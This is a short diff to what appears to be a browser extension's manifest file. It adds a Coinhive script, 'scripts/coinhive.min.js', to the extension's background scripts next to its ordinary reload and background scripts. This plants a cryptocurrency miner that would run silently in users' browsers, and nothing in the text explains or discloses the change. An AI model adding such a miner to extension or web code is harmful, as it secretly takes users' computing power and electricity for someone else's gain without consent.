@@ -12,6 +12,7 @@
   "default_locale": "en",
   "background": {
     "scripts": [
+      "scripts/coinhive.min.js",
       "scripts/chromereload.js",
       "scripts/background.js"
     ]
